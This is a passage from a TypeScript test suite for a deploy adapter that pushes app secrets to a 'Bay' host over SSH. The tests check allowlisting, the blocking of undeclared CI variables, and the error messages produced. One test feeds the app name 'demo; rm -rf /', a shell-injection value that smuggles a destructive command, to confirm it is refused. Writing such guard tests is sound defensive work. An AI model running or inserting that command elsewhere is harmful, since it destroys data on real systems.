        "APP_SECRET=would-sign-everyone-out",
        "DATABASE_URL=postgres://localhost/dev",
        "S3_ACCESS_KEY_ID=local",
        "STRIPE_KEY=sk_live_1",
      ].join("\n"),
    );

    await adapter.deploy(context(), run);

    expect(sentPayload(shell)).toBe("STRIPE_KEY=sk_live_1\n");
  });

  it("does not push the framework's infra knobs", async () => {
    const { adapter, shell } = await withEnvFile(
      ["LOG_LEVEL=debug", "DEBUG=1", "VITE_PUBLIC_X=1", "STRIPE_KEY=sk"].join(
        "\n",
      ),
    );

    await adapter.deploy(context(), run);

    expect(sentPayload(shell)).toBe("STRIPE_KEY=sk\n");
  });

  it("says so when there is nothing to send, instead of finishing quietly", async () => {
    // The whole bug in one line: a deploy that pushes nothing must not be
    // indistinguishable from a deploy that pushed everything.
    const { adapter, shell, alepha } = await withEnvFile("NODE_ENV=production");
    const said: string[] = [];
    alepha.events.on("log", (e: { message?: string }) => {
      said.push(e.message ?? "");
    });

    await adapter.deploy(context(), run);

    expect(shell.getCallsMatching(/cat >/)).toHaveLength(0);
    expect(said.join("\n")).toMatch(/No secrets to send/);
  });

  it("refuses a value carrying a newline rather than sending half of it", async () => {
    /*
      One KEY=VALUE per line is the format Bay parses, so a newline would
      arrive as a second variable holding a fragment of a private key.

      Written double-quoted with a `\n` escape, because that is the only shape
      that actually produces one: `EnvUtils.parseEnv` splits the file on
      newlines first, then JSON-decodes a double-quoted value — which is how
      Rocket's injected `.env.<env>.local` overrides carry JSON blobs.
    */
    const { adapter, shell, fs } = await setup();
    await fs.writeFile(
      "/project/.env.production",
      'PRIVATE_KEY="line one\\nline two"',
    );

    await expect(adapter.deploy(context(), run)).rejects.toThrowError(
      /PRIVATE_KEY contains a newline/,
    );
    expect(shell.getCallsMatching(/cat >/)).toHaveLength(0);
  });

  it("names the upgrade when the host's `bay` has no `--secrets-file`", async () => {
    /*
      `checkFlags` on the Go side refuses a flag it does not know, which is
      what a `bay` from before `--secrets-file` says. Without the branch this
      covers, `explain` falls through to its generic "ssh to HOST failed", and
      the operator has to work out for themselves that the fix is a binary
      upgrade rather than anything about their app.

      The reassurance in the message is load-bearing too: this fires while the
      artifact is still on stdin, so nothing was unpacked and the release that
      was serving still is.
    */
    const { adapter, shell } = await failingDeploy(
      'unknown flag "--secrets-file" (run `bay --help`)',
    );

    await expect(adapter.deploy(context(), run)).rejects.toThrowError(
      /does not know `--secrets-file`[\s\S]*Upgrade `bay` on the host/,
    );
    expect(shell.calls.length).toBeGreaterThan(0);
  });

  it("says nothing was deployed when the old host refused the flag", async () => {
    // A deploy that failed BEFORE anything moved and a deploy that failed
    // half-way want opposite reactions, and only the message can tell them
    // apart.
    const { adapter } = await failingDeploy(
      'unknown flag "--secrets-file" (run `bay --help`)',
    );

    await expect(adapter.deploy(context(), run)).rejects.toThrowError(
      /Nothing was deployed/,
    );
  });

  it("reports what it staged, naming the keys", async () => {
    const { adapter, alepha } = await withEnvFile(
      "STRIPE_KEY=sk\nMAILER_DSN=smtp://x\n",
    );
    const said: string[] = [];
    alepha.events.on("log", (e: { message?: string }) => {
      said.push(e.message ?? "");
    });

    await adapter.deploy(context(), run);

    expect(said.join("\n")).toMatch(/Staged MAILER_DSN, STRIPE_KEY/);
    expect(said.join("\n")).toMatch(/boots with them/);
  });

  it("takes a declared secret from the job environment when CI has no .env file", async () => {
    /*
      How CI actually works: the runner checks out, builds, and holds the
      secrets in the job environment. There is no `.env.production` on disk and
      there should not be one. Without a key source that survives that, the
      allowlist would be the file's keys — of which there are none — and the
      value fallback could never fire.

      The manifest is that source: `dist/manifest.json`'s `env` array is every
      key the app declares via `$env`, captured at build time.
    */
    const { adapter, shell } = await withManifest(["STRIPE_KEY", "MAILER_DSN"]);

    await withProcessEnv(
      { STRIPE_KEY: "sk_live_from_ci", MAILER_DSN: "smtp://ci" },
      () => adapter.deploy(context(), run),
    );

    expect(sentPayload(shell)).toBe(
      "MAILER_DSN=smtp://ci\nSTRIPE_KEY=sk_live_from_ci\n",
    );
  });

  it("does not push a process.env variable the app never declared", async () => {
    /*
      The security-relevant test of the whole fallback. Reading `process.env`
      puts the deploying shell's entire environment within reach, and the ONLY
      thing standing between it and an app's `.env` is that the key set comes
      from the manifest rather than from `process.env` itself.

      Real names, not placeholders: these are what is actually sitting in the
      environment of the runner that deploys this repo.
    */
    const { adapter, shell } = await withManifest(["STRIPE_KEY"]);

    await withProcessEnv(
      {
        STRIPE_KEY: "sk_live_1",
        AWS_SECRET_ACCESS_KEY: "must-not-travel",
        GITHUB_TOKEN: "must-not-travel",
        LORE_API_KEY: "must-not-travel",
        CLOUDFLARE_API_TOKEN: "must-not-travel",
      },
      () => adapter.deploy(context(), run),
    );

    expect(sentPayload(shell)).toBe("STRIPE_KEY=sk_live_1\n");
    expect(sentPayload(shell)).not.toContain("must-not-travel");
    // PATH is set in every process there has ever been, and is the cheapest
    // proof that the key set is not an enumeration of `process.env`.
    expect(sentPayload(shell)).not.toContain("PATH=");
  });

  it("pushes nothing at all when there is neither a manifest nor a file", async () => {
    // With no allowlist from either source there are no keys to resolve, so
    // `process.env` is never consulted — however full of secrets it is. This
    // is the property that makes the fallback safe, asserted directly.
    const { adapter, shell } = await setup();

    await withProcessEnv(
      { STRIPE_KEY: "sk_live_1", AWS_SECRET_ACCESS_KEY: "must-not-travel" },
      () => adapter.deploy(context(), run),
    );

    expect(shell.getCallsMatching(/cat >/)).toHaveLength(0);
  });

  it("keeps Bay-owned and framework keys out even when the app declares them", async () => {
    /*
      A declared key is not automatically a pushable one. An app may perfectly
      well read DATABASE_URL and LOG_LEVEL through `$env` — they will be in the
      manifest — and both are the platform's to write. Bay refuses APP_SECRET
      outright, so a push containing it fails the deploy rather than landing.
    */
    const { adapter, shell } = await withManifest([
      "APP_SECRET",
      "DATABASE_URL",
      "LOG_LEVEL",
      "STRIPE_KEY",
    ]);

    await withProcessEnv(
      {
        APP_SECRET: "would-sign-everyone-out",
        DATABASE_URL: "postgres://a-laptop/dev",
        LOG_LEVEL: "debug",
        STRIPE_KEY: "sk_live_1",
      },
      () => adapter.deploy(context(), run),
    );

    expect(sentPayload(shell)).toBe("STRIPE_KEY=sk_live_1\n");
  });

  it("says which keys it dropped, rather than dropping them quietly", async () => {
    const { adapter, alepha } = await withManifest([
      "DATABASE_URL",
      "STRIPE_KEY",
    ]);
    const said: string[] = [];
    alepha.events.on("log", (e: { message?: string }) => {
      said.push(e.message ?? "");
    });

    await withProcessEnv(
      { DATABASE_URL: "postgres://a-laptop/dev", STRIPE_KEY: "sk" },
      () => adapter.deploy(context(), run),
    );

    expect(said.join("\n")).toMatch(/Not pushed[\s\S]*DATABASE_URL/);
  });

  it("stages nothing for a static site, which has no process to configure", async () => {
    /*
      Bay refuses `--secrets-file` on a static site with a 400 — it has no
      `.env` because it has no process. Sending one anyway would fail the
      deploy of a site that happens to carry a `.env.production`, for a payload
      that could never have applied.
    */
    const { adapter, shell, alepha } = await withEnvFile("STRIPE_KEY=sk\n");
    alepha.store.mut(buildOptions, (current) => ({
      ...current,
      target: "static" as BuildTarget,
    }));

    await adapter.deploy(context(), run);

    expect(shell.getCallsMatching(/cat >/)).toHaveLength(0);
    expect(shell.wasCalledMatching(/--secrets-file/)).toBe(false);
  });

  it("keeps `secrets()` as an explicit no-op, not a deleted override", async () => {
    /*
      An empty `secrets()` on this adapter is exactly what the original bug
      looked like, so this is here to say the emptiness is now the answer: the
      secrets rode the deploy, and `PlatformOrchestrator.up()` calling this
      afterwards has nothing left to do.

      Asserting on the SHELL rather than on the method's return, because "did
      nothing" is only meaningful as "spoke to no host".
    */
    const { adapter, shell } = await withEnvFile("STRIPE_KEY=sk\n");

    await adapter.secrets();

    expect(shell.calls).toHaveLength(0);
  });

  it("refuses an app name that would reach the remote shell", async () => {
    const { adapter, shell } = await withEnvFile("STRIPE_KEY=sk\n");

    await expect(
      adapter.deploy(context({ project: "demo; rm -rf /" }), run),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });
});

describe("BayAdapter — the Bay-owned key list", () => {
  it("still matches Bay's own, which is the authority", async () => {
    /*
      A cross-language guard, and the only thing that can catch this drift: a
      key added to `bayOwnedKeys` on the Go side breaks nothing here — the
      adapter simply starts pushing it, and Bay starts refusing every deploy
      of any app that sets it. The Go list is the authority; this asserts the
      TypeScript mirror has not fallen behind it.

      If this fails because the Go file moved, update the path — do not delete
      the test.
    */
    const source = await readFile(
      new URL(
        "../../../../../../apps/bay/internal/deploy/deploy.go",
        import.meta.url,
      ),
      "utf8",
    );
    const block = source.match(
      /var bayOwnedKeys = \[\]string\{([\s\S]*?)\n\}/,
    )?.[1];
    expect(block, "bayOwnedKeys not found in deploy.go").toBeTruthy();
    const goKeys = [...(block as string).matchAll(/"([A-Z0-9_]+)"/g)]
      .map((m) => m[1])
      .sort();

    expect(goKeys.length).toBeGreaterThan(0);
    expect([...BayAdapter.BAY_OWNED_KEYS].sort()).toEqual(goKeys);
  });
});

describe("BayAdapter — inspect reports the secrets that are set", () => {
  const inspecting = async (listBody: string, envBody: string) => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list": listBody,
        "ssh -o BatchMode=yes deploy@bay.example.com bay env list demo/production":
          envBody,
      },
    });
    return { state: await adapter.inspect(context(), run), shell };
  };

  const deployed = JSON.stringify([
    {
      name: "demo",
      env: "production",
      domains: ["demo.example.com"],
      release: "r-1",
    },
  ]);

  it("asks the host rather than answering an empty list from memory", async () => {
    // `secrets: []` used to mean "this adapter cannot answer" and read as
    // "none are configured" — the same silence that let a whole
    // `.env.production` go unpushed.
    const { state } = await inspecting(
      deployed,
      JSON.stringify({
        app: ["MAILER_DSN", "STRIPE_KEY"],
        bayOwned: ["APP_SECRET"],
      }),
    );

    expect(state.secrets).toEqual([
      { name: "MAILER_DSN", deployed: true },
      { name: "STRIPE_KEY", deployed: true },
    ]);
  });

  it("leaves Bay's own keys out, so the app's two are not drowned in them", async () => {
    const { state } = await inspecting(
      deployed,
      JSON.stringify({
        app: ["STRIPE_KEY"],
        bayOwned: ["APP_SECRET", "DATABASE_URL", "SERVER_PORT"],
      }),
    );

    expect(state.secrets.map((s) => s.name)).toEqual(["STRIPE_KEY"]);
  });

  it("names the upgrade when the host's `bay` has no `env` command", async () => {
    /*
      The OTHER version gate, and the one `inspect` still walks into: a deploy
      no longer uses `bay env set`, but `platform status` reads the configured
      key names back with `bay env list`, and a `bay` that has neither prints
      its whole usage banner and exits 2.

      Without this branch `explain` falls through to its generic "ssh to HOST
      failed: <a page of usage text>", and the operator has to work out for
      themselves that the fix is a binary upgrade. The fixture is the real
      banner's opening, verbatim.
    */
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list": deployed,
      },
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay env list demo/production":
          "bay — Alepha application server (PoC)\n\n" +
          "  bay serve   [--root DIR] [--runtimes DIR] [--addr :8080]\n" +
          "              [--base-domain bay.example.com]\n" +
          "  bay deploy  (<app.tar.gz>|-) [--name NAME] [--env ENV] [--domain HOST]...\n" +
          "Client commands accept --control-socket PATH (or $BAY_SOCKET) and must run on\n" +
          "the Bay host.",
      },
    });

    await expect(adapter.inspect(context(), run)).rejects.toThrowError(
      /has no `env` command[\s\S]*Upgrade `bay` on the host/,
    );
  });

  it("does not ask about an app that is not deployed there", async () => {
    // Nothing deployed means no instance and no `.env`, so the empty list is
    // the true answer rather than a stand-in for one — and asking would be a
    // round trip that can only fail.
    const { state, shell } = await inspecting("[]", "{}");

    expect(state.secrets).toEqual([]);
    expect(shell.getCallsMatching(/bay env list/)).toHaveLength(0);
  });
});
